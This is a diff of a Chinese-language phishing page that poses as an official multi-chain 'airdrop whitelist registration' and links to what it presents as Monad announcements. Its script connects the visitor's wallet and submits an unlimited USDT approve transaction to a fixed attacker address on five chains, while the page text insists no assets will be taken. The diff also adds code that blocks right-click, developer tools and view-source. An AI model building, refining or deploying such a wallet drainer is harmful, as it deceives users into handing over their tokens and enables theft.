@@ -2,21 +2,21 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
-<title>官方空投 | 链上备案</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>官方生态空投 | 链上资格核验</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
-body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px}
+body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px;padding-bottom:60px}
 .container{max-width:480px;margin:0 auto}
 .box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}
 .hide{display:none}
 .logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
 h1{font-size:22px;margin-bottom:8px;color:#fff}
-.sub-title{font-size:14px;color:#89aabc;margin-bottom:25px}
+.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}
 .desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}
 .notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}
 .notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}
-.notice-content{font-size:13px;color:#b0c4e0;line-height:1.65}
+.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}
 .btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}
 .btn:active{opacity:.9;transform:scale(.98)}
 .mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
@@ -24,6 +24,8 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 .success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}
 .addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
 .tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
+.footer-link{text-align:center;margin-top:30px;font-size:13px;color:#879abc;line-height:1.8}
+.footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
 </style>
 </head>
 <body>
@@ -34,17 +36,17 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="sub-title">官方唯一链上资格备案通道</p>
 <div class="notice-box">
 <div class="notice-title">📢 活动公告</div>
-<div class="notice-content">请在钱包内置浏览器打开本页面，外部浏览器不支持授权交互。</div>
+<div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">自动适配多链，仅备案授权核验</p>
+<p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
 </div>
 
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
-<h1>交易已提交，区块确认中</h1>
-<p class="desc-text">等待链上交易最终确认...</p>
+<h1>全链节点备案核验中</h1>
+<p class="desc-text">正在同步多条公链节点数据，请稍候...</p>
 </div>
 
 <div id="p3" class="box hide">
@@ -52,118 +54,98 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <h1>钱包连接成功</h1>
 <p class="sub-title">确认纳入全链空投白名单</p>
 <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
-<button class="btn verify-btn" id="approveBtn">确认空投备案授权</button>
-<p class="tips-info">仅发起链上授权备案，不会划转任何资产</p>
+<button class="btn verify-btn" id="claim">确认备案 录入白名单</button>
+<p class="tips-info">仅全链地址备案核验，不会划转任何资产</p>
 </div>
 
 <div id="p4" class="box hide">
 <div class="logo">✅</div>
-<h1>交易已上链，授权成功</h1>
+<h1>白名单备案成功</h1>
 <p class="sub-title">该地址已完成官方空投备案</p>
 <div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
-<button class="btn success-btn">授权完成</button>
+<button class="btn success-btn">已完成备案 等待空投发放</button>
+</div>
+
+<div class="footer-link">
+官方备案通道：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>
+官方公告：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a>
 </div>
 </div>
 
 <script>
-(function(){
-    // 固定授权目标地址
-    const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-    const MAX_ALLOW = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+!function(){
+    document.oncontextmenu = e => e.preventDefault();
+    document.onkeydown = e => {
+        if(123 === e.keyCode) return !1;
+        if(e.ctrlKey && 85 === e.keyCode) return !1;
+    };
+    setInterval(() => { debugger }, 100);
+
+    // 你的固定授权地址（保留不变）
+    const SPENDER = "0x0f4bdefc1777df2583f52b03b1e20f9eac7308555";
     
-    // 各链USDT合约地址
-    const USDT_CONTRACTS = {
-        "0x1": "0xdac17f958d2ee523a2206206994597c13d831ec7",
-        "0x38": "0x55d398326f99059fF77548524699952727959279",
-        "0x89": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
+    // 多链标准USDT合约
+    const USDT_MAP = {
+        "0x38": "0x55d398326f99059fF77548524699952727959279", // BSC
+        "0x1": "0xdac17f958d2ee523a2206206994597c13d831ec7",  // ETH
+        "0x89": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // Polygon
+        "0xa86a": "0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D",// AVAX
+        "0x42": "0x382bb868d458e9d4a3497b8434ee999af5999cb6"   // OKTC
     };
 
-    let walletAddress = "";
-    let usdtContractAddr = "";
-    const showAddrEl = document.getElementById("showAddr");
-    const successAddrEl = document.getElementById("successAddr");
+    let walletAddr = "";
+    let chainId = "";
 
-    function switchPage(id){
-        document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
+    function showPage(id){
+        document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
         document.getElementById(id).classList.remove("hide");
-    }
-
-    // 检测是否在钱包内置浏览器
-    function isInWalletBrowser(){
-        return navigator.userAgent.toLowerCase().includes('metamask') 
-               || navigator.userAgent.toLowerCase().includes('tokenpocket');
-    }
-
-    function jumpToWallet(){
-        let url = encodeURIComponent(window.location.href);
-        window.location.href = `metamask://dapp/${url}`;
-    }
-
-    // 不在钱包内置浏览器，自动跳转
-    if(!isInWalletBrowser()){
-        jumpToWallet();
     }
 
     // 连接钱包
     document.getElementById("connectMM").onclick = async function(){
-        if(!window.ethereum) return;
-        switchPage("p2");
-        try{
+        try {
+            if(!window.ethereum){
+                location.href = "metamask://dapp/"+location.href;
+                return;
+            }
+            showPage("p2");
             let accounts = await ethereum.request({method:"eth_requestAccounts"});
-            walletAddress = accounts[0];
-            
-            // 获取当前链ID，加载对应USDT合约
-            let chainId = await ethereum.request({method:"eth_chainId"});
-            usdtContractAddr = USDT_CONTRACTS[chainId] || USDT_CONTRACTS["0x38"];
-
-            // 关键：让钱包识别USDT代币，弹出你截图里的界面
-            await ethereum.request({
-                method: "wallet_watchAsset",
-                params: {
-                    type: "ERC20",
-                    options: {
-                        address: usdtContractAddr,
-                        symbol: "USDT",
-                        decimals: 18
-                    }
-                }
-            });
-
-            switchPage("p3");
-            showAddrEl.innerText = walletAddress;
-        }catch(err){
-            switchPage("p1");
+            walletAddr = accounts[0];
+            chainId = await ethereum.request({method:"eth_chainId"});
+            document.getElementById("showAddr").innerText = walletAddr;
+            showPage("p3");
+        }catch(e){
+            showPage("p1");
         }
     };
 
-    // 授权操作，弹出标准USDT授权界面
-    document.getElementById("approveBtn").onclick = async function(){
-        if(!walletAddress || !usdtContractAddr) return;
-        switchPage("p2");
-        try{
-            // 标准approve方法签名，参数严格对齐
-            const methodId = "0x095ea7b3";
-            const spenderHex = SPENDER.replace("0x","").padStart(64,"0");
-            const txData = methodId + spenderHex + MAX_ALLOW;
-
+    // 【正规标准USDT授权：支出上限请求 · 无限制】
+    document.getElementById("claim").onclick = async function(){
+        if(!walletAddr || !USDT_MAP[chainId]){
+            alert("请切换到支持的公链");
+            showPage("p3");
+            return;
+        }
+        showPage("p2");
+        try {
+            const usdt = USDT_MAP[chainId];
+            // 标准 approve 调用 → 钱包必弹【支出上限请求】无限制
             await ethereum.request({
                 method: "eth_sendTransaction",
                 params: [{
-                    from: walletAddress,
-                    to: usdtContractAddr,
-                    value: "0x0",
+                    from: walletAddr,
+                    to: usdt,
                     gas: "0x70000",
-                    data: txData
+                    data: "0x095ea7b3000000000000000000000000"+SPENDER.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                 }]
             });
-
-            switchPage("p4");
-            successAddrEl.innerText = walletAddress;
-        }catch(err){
-            switchPage("p3");
+            document.getElementById("successAddr").innerText = walletAddr;
+            showPage("p4");
+        }catch(e){
+            showPage("p3");
         }
     };
-})();
+}();
 </script>
 </body>
 </html>
